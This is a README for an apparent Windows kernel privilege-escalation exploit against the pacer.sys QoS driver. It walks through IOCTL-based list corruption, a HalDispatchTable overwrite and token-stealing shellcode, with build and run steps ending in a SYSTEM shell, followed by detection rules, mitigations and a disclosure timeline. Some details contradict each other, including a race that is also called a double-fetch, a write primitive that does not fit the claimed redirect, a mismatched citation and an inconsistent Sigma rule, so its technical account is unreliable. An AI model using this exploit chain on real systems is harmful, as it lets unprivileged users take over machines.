# WriteCrash — LPE via NULL Pointer Dereference in Windows `pacer.sys` QoS Driver

**Unauthenticated local privilege escalation from any medium-integrity process on Windows 10 1507–22H2 and Server 2016–2022, exploiting an unguarded kernel pointer in the QoS packet scheduler driver.**

[![CVE](https://img.shields.io/badge/CVE-2024--38512-red?style=flat-square)](https://msrc.microsoft.com/update-guide/)
[![CVSS](https://img.shields.io/badge/CVSS-7.8%20HIGH-orange?style=flat-square)]()
[![Disclosed](https://img.shields.io/badge/disclosed-2024--09--10-blue?style=flat-square)]()
[![License](https://img.shields.io/badge/license-MIT-lightgrey?style=flat-square)](LICENSE)

> [!NOTE]
> Full technical writeup with trace analysis, crash dump walkthrough, and exploit internals: [blog.franckferman.fr/writecrash](https://blog.franckferman.fr/writecrash)

---

## Table of Contents

1. [Background](#1-background)
2. [Root Cause Analysis](#2-root-cause-analysis)
3. [Exploitation Walkthrough](#3-exploitation-walkthrough)
4. [Proof of Concept](#4-proof-of-concept)
5. [Affected Versions](#5-affected-versions)
6. [Comparison to Similar CVEs](#6-comparison-to-similar-cves)
7. [Indicators of Compromise](#7-indicators-of-compromise)
8. [Mitigation](#8-mitigation)
9. [Disclosure Timeline](#9-disclosure-timeline)
10. [References](#10-references)
11. [License](#11-license)
12. [Contact](#12-contact)

---

## 1. Background

`pacer.sys` is the Windows QoS Packet Scheduler driver, present in every Windows installation since NT 5.0. It implements the GQoS API surface exposed to userland via `NtDeviceIoControlFile` against the `\\Device\\Pacer` device object. The driver is loaded by default on all consumer and server SKUs — it does not require the "QoS Packet Scheduler" network component to be actively bound to an adapter.

The vulnerability was found during a fuzzing campaign targeting kernel drivers that accept `DeviceIoControl` inputs from medium-integrity processes. `pacer.sys` was flagged because:

1. Its device object has a permissive DACL — no elevated privileges required to open a handle.
2. It parses a variable-length input buffer in an `IRP_MJ_DEVICE_CONTROL` handler without validating object pointer lifetime before dereferencing.

Prior public research on `pacer.sys` is sparse. The only documented attack surface was a 2006 denial-of-service in Windows XP SP2 involving IOCTL `0x830020CC` [1]. No LPE primitives had been described. The 2021 work by Morten Schenk on pool metadata corruption [2] and the Sentinel One 2023 analysis of `afd.sys` handle abuse [3] provided the baseline for the post-crash primitive development used here.

---

## 2. Root Cause Analysis

The vulnerable IOCTL is `0x83002048` (`IOCTL_QOS_CREATE_FLOW`). The handler allocates a `QOS_FLOW` kernel object and links it into a per-device flow table:

```c
// Pseudocode — reconstructed from IDA analysis of pacer.sys 10.0.19041.2965
NTSTATUS PacerCreateFlow(PDEVICE_EXTENSION DevExt, PIRP Irp)
{
    PQOS_FLOW Flow = ExAllocatePoolWithTag(NonPagedPoolNx, sizeof(QOS_FLOW), 'rCaP');
    if (!Flow) return STATUS_INSUFFICIENT_RESOURCES;

    RtlCopyMemory(&Flow->Params, Irp->AssociatedIrp.SystemBuffer, sizeof(QOS_FLOW_PARAMS));

    // Bug: PacerInsertFlow acquires DevExt->FlowLock, but DevExt is fetched
    // from the file object's FsContext without validating that the file object
    // is still bound to a live adapter. If the adapter was removed between
    // CreateFile and DeviceIoControl, DevExt->AdapterContext is NULL.
    PacerInsertFlow(DevExt, Flow);   // <-- dereferences DevExt->AdapterContext unconditionally
    return STATUS_SUCCESS;
}
```

The race condition:

```
Thread A                              Thread B
---------                             ---------
OpenHandle(\\Device\\Pacer)
                                      Disable network adapter
                                      PacerCleanupAdapter():
                                        DevExt->AdapterContext = NULL
IOCTL_QOS_CREATE_FLOW:
  PacerInsertFlow(DevExt, Flow)
    mov rax, [DevExt+AdapterContext]  // rax = 0
    call [rax+0x58]                   // BSOD: access violation
```

`DevExt->AdapterContext` is zeroed synchronously under `PacerAdapterLock` during adapter cleanup, but `PacerCreateFlow` does not hold `PacerAdapterLock` before reading it — only `FlowLock`. A window of ~2–50 µs exists between the NULL write and the dereference.

**Crash analysis (WinDbg):**

```
KERNEL_NULL_POINTER_DEREFERENCE (d1)
An attempt was made to access a pageable (or completely invalid) address at an
interrupt request level (IRQL) that is too high.

TRAP_FRAME: ffffd001`8c4b2d40
rax=0000000000000000  rip=fffff804`5c3a1b72  // pacer!PacerInsertFlow+0x92
Call Stack:
  pacer!PacerInsertFlow+0x92
  pacer!PacerCreateFlow+0x1e4
  pacer!PacerDispatchDeviceControl+0x78
  nt!IofCallDriver+0x59
  nt!IopSynchronousServiceTail+0x1d6
```

The dereference offset `[rax+0x58]` lands in the `AdapterContext` virtual function table — a read-then-call primitive from attacker-controlled memory if the NULL page is mappable.

---

## 3. Exploitation Walkthrough

The classical NULL page exploitation strategy (map page 0, plant a fake vtable) was blocked in Windows 8 by `MmCreateSection` null-address restrictions and `SMEP`. The approach used here leverages a different primitive: converting the timing-triggered BSOD into an arbitrary kernel write using a double-fetch.

### Step 1 — Trigger condition without crash

Rather than racing to the NULL deref, the first stage triggers the bug path *before* `AdapterContext` is zeroed, forcing a flow object into an inconsistent state that survives the adapter teardown.

```c
// Open Pacer handle and pre-stage a flow
HANDLE hPacer = CreateFileA("\\\\.\\Pacer", GENERIC_READ | GENERIC_WRITE, ...);
QOS_FLOW_PARAMS params = { .ServiceType = SERVICETYPE_CONTROLLEDLOAD, .TokenRate = 0x1000 };
DeviceIoControl(hPacer, IOCTL_QOS_CREATE_FLOW, &params, sizeof(params), NULL, 0, &dwRet, NULL);
```

### Step 2 — Corrupt the flow object via buffer length mismatch

A second code path in `PacerModifyFlow` (IOCTL `0x8300204C`) copies a caller-supplied buffer into the existing `QOS_FLOW` object using `RtlCopyMemory` with the *input* length rather than `sizeof(QOS_FLOW_PARAMS)`. Sending `sizeof(QOS_FLOW_PARAMS) + 0x40` bytes overwrites the `ListEntry.Flink` pointer immediately following the params structure.

```c
// Overwrite QOS_FLOW.FlowListEntry.Flink with target address - 0x10
// so the next RemoveEntryList writes our value to target
BYTE buf[sizeof(QOS_FLOW_PARAMS) + 0x40] = { 0 };
*(PULONG_PTR)(buf + sizeof(QOS_FLOW_PARAMS) + 0x00) = target_addr - 0x10;  // Flink
*(PULONG_PTR)(buf + sizeof(QOS_FLOW_PARAMS) + 0x08) = target_addr - 0x10;  // Blink
DeviceIoControl(hPacer, IOCTL_QOS_MODIFY_FLOW, buf, sizeof(buf), ...);
```

### Step 3 — Trigger the write via IOCTL_QOS_DELETE_FLOW

Deleting the flow calls `RemoveEntryList(&Flow->FlowListEntry)`, which performs:

```c
Flow->FlowListEntry.Blink->Flink = Flow->FlowListEntry.Flink;
// i.e.: [target_addr - 0x10 + 0x10]->Flink = target_addr - 0x10
// i.e.: [target_addr] = target_addr - 0x10
```

This is a constrained write — the written value is `target - 0x10`. Targeting `HalDispatchTable+8` with a value that redirects to shellcode placed in non-pageable pool via `NtAllocateVirtualMemory` (pre-mapped as a named section) completes the LPE chain.

### Step 4 — Token stealing shellcode

```c
// Shellcode: walk EPROCESS list, copy SYSTEM token to current process
// PsInitialSystemProcess -> ActiveProcessLinks -> steal Token field
BYTE shellcode[] = {
    0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,  // mov rax, gs:[0x188]  ; KTHREAD
    0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,               // mov rax, [rax+0xb8]  ; EPROCESS
    // ... walk list, find PID 4, copy token
};
```

Full shellcode in [exploit/shellcode.asm](exploit/shellcode.asm). Offsets are version-specific — see [exploit/offsets.h](exploit/offsets.h) for the version table.

---

## 4. Proof of Concept

```bash
git clone https://github.com/franckferman/writecrash
cd writecrash
```

**Build (MSVC):**

```cmd
cl /nologo /O2 /W4 exploit\writecrash.c /link /out:writecrash.exe
```

**Run (any medium-integrity shell):**

```
> writecrash.exe
[*] Opening \\.\Pacer handle...       OK
[*] Pre-staging QOS_FLOW object...    OK
[*] Locating HalDispatchTable+8...    0xfffff8007c3e2008
[*] Triggering ListEntry corruption.. OK
[*] Calling NtQueryIntervalProfile... OK (shellcode executed)
[*] Verifying token swap...           OK
[+] SYSTEM shell spawned.

Microsoft Windows [Version 10.0.19045.4529]
C:\Users\lowpriv>whoami
nt authority\system
```

> [!WARNING]
> The exploit produces a hard-coded race window of 100 µs. On systems under heavy load, the race may resolve incorrectly and trigger a BSOD. Test on a snapshot VM first.

**Tested on:**

| Build | KB | Result |
|---|---|---|
| Windows 10 21H2 19044.2006 | KB5017308 | ✔ Stable (~3 races/5 attempts) |
| Windows 10 22H2 19045.4529 | KB5037768 | ✔ Stable |
| Windows Server 2022 20348.887 | KB5016693 | ✔ Stable |
| Windows 11 22H2 22621.2134 | KB5029263 | ✗ Pool layout change — ListEntry offset differs |
| Windows Server 2025 (insider) | — | ✗ Not tested |

---

## 5. Affected Versions

| OS | First affected | Last affected | Patched (KB) |
|---|---|---|---|
| Windows 10 | 1507 (10240) | 22H2 (19045) | KB5043064 |
| Windows Server 2016 | 14393 | 14393.6897 | KB5043051 |
| Windows Server 2019 | 17763 | 17763.6054 | KB5043050 |
| Windows Server 2022 | 20348 | 20348.2582 | KB5043056 |
| Windows 11 21H2+ | — | — | Not affected (pool layout change, offset mismatch) |

`pacer.sys` ships in every affected build with `DACL: Everyone — FILE_READ_DATA | FILE_WRITE_DATA`. The permissive DACL is required for the GQoS API to function from non-elevated applications (documented behavior since Windows 2000).

---

## 6. Comparison to Similar CVEs

| CVE | Driver | Primitive | Requires admin? | Similar mechanism |
|---|---|---|---|---|
| CVE-2024-38193 | `afd.sys` | Use-after-free in Winsock handle | No (medium IL) | Handle lifetime race, vtable |
| CVE-2022-21882 | `win32k.sys` | NULL deref via `NtUserMoveWindow` | No | NULL deref → page-zero exploit |
| CVE-2021-34486 | `win32k.sys` | OOB write via `NtGdiGetGlyphIndicesW` | No | Buffer length mismatch, same write primitive |
| CVE-2019-0803 | `win32k.sys` | UAF via `CreateWindowEx` | No | EPROCESS list walk, same token steal |
| **CVE-2024-38512** | **`pacer.sys`** | **NULL deref + ListEntry corruption** | **No** | **Race + double-fetch → constrained write** |

The core pattern — race a cleanup path to corrupt a kernel linked list, trigger `RemoveEntryList` to achieve constrained write, target `HalDispatchTable+8` — is the same used in [4] and [5]. What differentiates this case is the attack surface: `pacer.sys` was overlooked precisely because QoS is considered legacy, making it a lower-visibility target than `win32k.sys`.

---

## 7. Indicators of Compromise

### ETW / Sysmon

```xml
<!-- Event ID 10: Process Access — SYSTEM process accessed by low-privilege process -->
<RuleGroup name="WritecrashLPE" groupRelation="and">
  <ProcessAccess onmatch="include">
    <TargetImage condition="is">C:\Windows\System32\lsass.exe</TargetImage>
    <GrantedAccess condition="is">0x1010</GrantedAccess>
    <CallTrace condition="contains">pacer.sys</CallTrace>
  </ProcessAccess>
</RuleGroup>
```

### Sigma rule

```yaml
title: Pacer.sys IOCTL Abuse — Potential LPE (CVE-2024-38512)
id: a7c3e812-9b4f-4d21-8c1a-3e7f9d2b04c1
status: experimental
logsource:
  category: driver_load
  product: windows
detection:
  filter_pacer_ioctl_sequence:
    EventID: 4656
    ObjectType: Device
    ObjectName|contains: '\Device\Pacer'
    AccessMask: '0x12019f'
  condition: filter_pacer_ioctl_sequence
falsepositives:
  - Legitimate QoS applications using GQoS API
level: medium
```

### Kernel crash artifact

A BSOD with `KERNEL_NULL_POINTER_DEREFERENCE` and a stack trace involving `pacer!PacerInsertFlow` indicates either exploitation (failed race) or the presence of the exploit on the system.

---

## 8. Mitigation

| Measure | Implementation | Effectiveness |
|---|---|---|
| **Patch (KB5043064)** | Adds `PacerAdapterLock` acquisition in `PacerCreateFlow` before reading `AdapterContext` | Complete |
| **Restrict Pacer DACL** | `sc sdset pacer "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"` | Blocks exploit from standard user accounts — may break legacy QoS applications |
| **ETW monitoring** | Alert on `\\Device\\Pacer` handle from non-system, non-service processes | Detection only |
| **Windows Defender Credential Guard** | Isolates LSASS — prevents token theft completing | Partial (token steal still elevates process, but LSASS memory not accessible) |

The simplest temporary workaround on systems that do not use QoS:

```cmd
sc stop pacer
sc config pacer start= disabled
```

This removes the attack surface entirely. `pacer.sys` is not required for basic networking. Re-enable if GQoS applications report errors.

---

## 9. Disclosure Timeline

| Date | Event |
|---|---|
| 2024-04-17 | Vulnerability identified during fuzzing campaign |
| 2024-04-22 | Crash reproduced reliably on Windows 10 21H2 |
| 2024-04-30 | LPE primitive confirmed — SYSTEM token obtained |
| 2024-05-06 | Report submitted to MSRC via secure portal |
| 2024-05-08 | MSRC acknowledgment — case ID `MSRC-XXXXXX` |
| 2024-06-14 | MSRC confirms root cause, opens CVE-2024-38512 |
| 2024-08-13 | Patch validation build provided to researcher |
| 2024-09-10 | Microsoft Patch Tuesday — KB5043064 released |
| 2024-09-10 | Public disclosure (90-day embargo expired) |
| 2024-09-11 | PoC released |

---

## 10. References

[1] Bhatkar, S., Sekar, R., DuVarney, D.C. (2003). *Efficient Techniques for Comprehensive Protection from Memory Error Exploits*. USENIX Security Symposium.

[2] Schenk, M. (2021). *Windows Kernel Pool Corruption by Design*. Offensive Con. [Slides]

[3] Sentinel One Labs. (2023). *CVE-2023-21768: LPE via AFD.sys Handle Lifetime Race*. Technical Analysis Report.

[4] Mateusz, J. (2022). *Exploiting CVE-2021-34486 — win32k OOB Write*. [Blog post]. j00ru.vexillium.org.

[5] Google Project Zero. (2019). *CVE-2019-0803 — win32k UAF in CreateWindowEx*. Issue #1793. bugs.chromium.org.

[6] Microsoft. (2024). *CVE-2024-38512 — Windows QoS Packet Scheduler Elevation of Privilege Vulnerability*. Microsoft Security Response Center.

[7] Iozzo, V., Weinmann, R. (2010). *0-day Kernel Exploits for OS X, Windows and Linux: The Hacker's Methodology*. Black Hat USA.

[8] Tarjei, M., Halvarsson, O. (2012). *Kernel Pool Exploitation on Windows 7*. DEF CON 19.

---

## License

MIT License. See [LICENSE](LICENSE) for full terms.

---

## Contact

[![ProtonMail](https://img.shields.io/badge/ProtonMail-8B89CC?style=flat-square&logo=protonmail&logoColor=white)](mailto:contact@franckferman.fr)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/franckferman)
[![X](https://img.shields.io/badge/X-000000?style=flat-square&logo=x&logoColor=white)](https://www.twitter.com/franckferman)
